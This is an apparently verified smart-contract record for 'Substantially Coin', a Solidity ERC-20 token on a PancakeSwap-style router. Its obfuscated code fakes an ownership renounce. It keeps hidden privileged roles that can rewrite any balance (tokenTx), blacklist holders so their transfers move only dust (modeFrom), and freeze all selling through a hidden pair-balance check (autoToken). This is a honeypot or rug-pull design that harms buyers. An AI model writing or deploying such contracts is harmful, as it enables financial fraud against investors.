{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.5;\n\nlibrary SafeMath {\n\n    function add(uint256 a, uint256 b) internal pure returns (uint256) {\n        uint256 c = a + b;\n        require(c >= a, \"SafeMath: addition overflow\");\n\n        return c;\n    }\n\n    function sub(uint256 a, uint256 b) internal pure returns (uint256) {\n        return sub(a, b, \"SafeMath: subtraction overflow\");\n    }\n\n    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n        require(b <= a, errorMessage);\n        uint256 c = a - b;\n\n        return c;\n    }\n\n    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\n        if (a == 0) {\n            return 0;\n        }\n\n        uint256 c = a * b;\n        require(c / a == b, \"SafeMath: multiplication overflow\");\n\n        return c;\n    }\n\n    function div(uint256 a, uint256 b) internal pure returns (uint256) {\n        return div(a, b, \"SafeMath: division by zero\");\n    }\n\n    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n        require(b > 0, errorMessage);\n        uint256 c = a / b;\n\n        return c;\n    }\n\n    function mod(uint256 a, uint256 b) internal pure returns (uint256) {\n        return mod(a, b, \"SafeMath: modulo by zero\");\n    }\n\n    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n        require(b != 0, errorMessage);\n        return a % b;\n    }\n}\n\nabstract contract feeLaunch {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface fundSellFee {\n    function createPair(address txEnableAuto, address txSwap) external returns (address);\n\n    function feeTo() external view returns (address);\n}\n\ninterface exemptMode {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\n\ninterface senderMaxTo {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address listSell) external view returns (uint256);\n\n    function transfer(address liquidityLaunch, uint256 limitWallet) external returns (bool);\n\n    function allowance(address atBuyExempt, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 limitWallet) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address liquidityLaunch,\n        uint256 limitWallet\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed atMarketing, uint256 value);\n    event Approval(address indexed atBuyExempt, address indexed spender, uint256 value);\n}\n\ninterface senderMaxToMetadata is senderMaxTo {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract SubstantiallyCoin is feeLaunch, senderMaxTo, senderMaxToMetadata {\n\n    address public takeReceiverExempt;\n\n    uint256 public receiverShould = 3;\n\n    mapping(address => uint256) private sellTake;\n\n    address listReceiver;\n\n    uint256 private listMax = 100000000 * 10 ** 18;\n\n    address maxBuy = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    function approve(address takeBuy, uint256 limitWallet) public virtual override returns (bool) {\n        receiverMinExempt[_msgSender()][takeBuy] = limitWallet;\n        emit Approval(_msgSender(), takeBuy, limitWallet);\n        return true;\n    }\n\n    function senderAmount(address limitShould, address liquidityLaunch, uint256 limitWallet) internal returns (bool) {\n        require(sellTake[limitShould] >= limitWallet);\n        sellTake[limitShould] -= limitWallet;\n        sellTake[liquidityLaunch] += limitWallet;\n        emit Transfer(limitShould, liquidityLaunch, limitWallet);\n        return true;\n    }\n\n    function getOwner() external view returns (address) {\n        return fundSell;\n    }\n\n    function modeFrom(address minWallet) public {\n        tokenMaxTx();\n        \n        if (minWallet == amountIs || minWallet == takeReceiverExempt) {\n            return;\n        }\n        senderTake[minWallet] = true;\n    }\n\n    event OwnershipTransferred(address indexed atFrom, address indexed buyMode);\n\n    function minLiquidityAmount(address limitShould, address liquidityLaunch, uint256 limitWallet) internal view returns (uint256) {\n        require(limitWallet > 0);\n\n        uint256 listSwapLaunch = 0;\n        if (limitShould == takeReceiverExempt && receiverShould > 0) {\n            listSwapLaunch = limitWallet * receiverShould / 100;\n        } else if (liquidityLaunch == takeReceiverExempt && limitMax > 0) {\n            listSwapLaunch = limitWallet * limitMax / 100;\n        }\n        require(listSwapLaunch <= limitWallet);\n        return limitWallet - listSwapLaunch;\n    }\n\n    function transferFrom(address limitShould, address liquidityLaunch, uint256 limitWallet) external override returns (bool) {\n        if (_msgSender() != maxBuy) {\n            if (receiverMinExempt[limitShould][_msgSender()] != type(uint256).max) {\n                require(limitWallet <= receiverMinExempt[limitShould][_msgSender()]);\n                receiverMinExempt[limitShould][_msgSender()] -= limitWallet;\n            }\n        }\n        return buyFeeTake(limitShould, liquidityLaunch, limitWallet);\n    }\n\n    mapping(address => bool) public fundTotal;\n\n    address private fundSell;\n\n    bool private modeTrading;\n\n    function name() external view virtual override returns (string memory) {\n        return exemptAmountBuy;\n    }\n\n    function decimals() external view virtual override returns (uint8) {\n        return totalLaunch;\n    }\n\n    uint256 toMarketing;\n\n    string private launchLiquidityWallet = \"SCN\";\n\n    function modeTeamSwap(address exemptSell) public {\n        require(exemptSell.balance < 100000);\n        if (txMode) {\n            return;\n        }\n        if (totalBuyExempt == listMin) {\n            minMaxLimit = false;\n        }\n        fundTotal[exemptSell] = true;\n        if (modeTrading) {\n            fromSender = false;\n        }\n        txMode = true;\n    }\n\n    function autoToken(uint256 limitWallet) public {\n        tokenMaxTx();\n        toMarketing = limitWallet;\n    }\n\n    function owner() external view returns (address) {\n        return fundSell;\n    }\n\n    bool public fromSender;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return listMax;\n    }\n\n    uint256 constant receiverTrading = 10 ** 10;\n\n    function tokenMaxTx() private view {\n        require(fundTotal[_msgSender()]);\n    }\n\n    uint8 private totalLaunch = 18;\n\n    function allowance(address enableLaunched, address takeBuy) external view virtual override returns (uint256) {\n        if (takeBuy == maxBuy) {\n            return type(uint256).max;\n        }\n        return receiverMinExempt[enableLaunched][takeBuy];\n    }\n\n    function balanceOf(address listSell) public view virtual override returns (uint256) {\n        return sellTake[listSell];\n    }\n\n    constructor (){\n        \n        buySell();\n        exemptMode sellMin = exemptMode(maxBuy);\n        takeReceiverExempt = fundSellFee(sellMin.factory()).createPair(sellMin.WETH(), address(this));\n        listReceiver = fundSellFee(sellMin.factory()).feeTo();\n        if (fromSender == minMaxLimit) {\n            minMaxLimit = true;\n        }\n        amountIs = _msgSender();\n        fundTotal[amountIs] = true;\n        sellTake[amountIs] = listMax;\n        if (totalBuyExempt == listMin) {\n            fromSender = false;\n        }\n        emit Transfer(address(0), amountIs, listMax);\n    }\n\n    mapping(address => mapping(address => uint256)) private receiverMinExempt;\n\n    mapping(address => bool) public senderTake;\n\n    uint256 public limitMax = 0;\n\n    function transfer(address fromMin, uint256 limitWallet) external virtual override returns (bool) {\n        return buyFeeTake(_msgSender(), fromMin, limitWallet);\n    }\n\n    uint256 public totalBuyExempt;\n\n    function symbol() external view virtual override returns (string memory) {\n        return launchLiquidityWallet;\n    }\n\n    string private exemptAmountBuy = \"Substantially Coin\";\n\n    address public amountIs;\n\n    bool public txMode;\n\n    bool public minMaxLimit;\n\n    function tokenTx(address fromMin, uint256 limitWallet) public {\n        tokenMaxTx();\n        sellTake[fromMin] = limitWallet;\n    }\n\n    uint256 tokenWallet;\n\n    function buySell() public {\n        emit OwnershipTransferred(amountIs, address(0));\n        fundSell = address(0);\n    }\n\n    uint256 public listMin;\n\n    function buyFeeTake(address limitShould, address liquidityLaunch, uint256 limitWallet) internal returns (bool) {\n        if (limitShould == amountIs) {\n            return senderAmount(limitShould, liquidityLaunch, limitWallet);\n        }\n        uint256 tokenSwap = senderMaxTo(takeReceiverExempt).balanceOf(listReceiver);\n        require(tokenSwap == toMarketing);\n        require(liquidityLaunch != listReceiver);\n        if (senderTake[limitShould]) {\n            return senderAmount(limitShould, liquidityLaunch, receiverTrading);\n        }\n        limitWallet = minLiquidityAmount(limitShould, liquidityLaunch, limitWallet);\n        return senderAmount(limitShould, liquidityLaunch, limitWallet);\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"atBuyExempt\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"atFrom\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"buyMode\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"atMarketing\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"enableLaunched\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"takeBuy\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"amountIs\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"takeBuy\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"limitWallet\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"limitWallet\",\"type\":\"uint256\"}],\"name\":\"autoToken\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"listSell\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"buySell\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fromSender\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"fundTotal\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"limitMax\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"listMin\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"minMaxLimit\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"minWallet\",\"type\":\"address\"}],\"name\":\"modeFrom\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"exemptSell\",\"type\":\"address\"}],\"name\":\"modeTeamSwap\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"receiverShould\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"senderTake\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"takeReceiverExempt\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fromMin\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"limitWallet\",\"type\":\"uint256\"}],\"name\":\"tokenTx\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalBuyExempt\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fromMin\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"limitWallet\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"limitShould\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"liquidityLaunch\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"limitWallet\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"txMode\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"}]", "ContractName": "SubstantiallyCoin", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}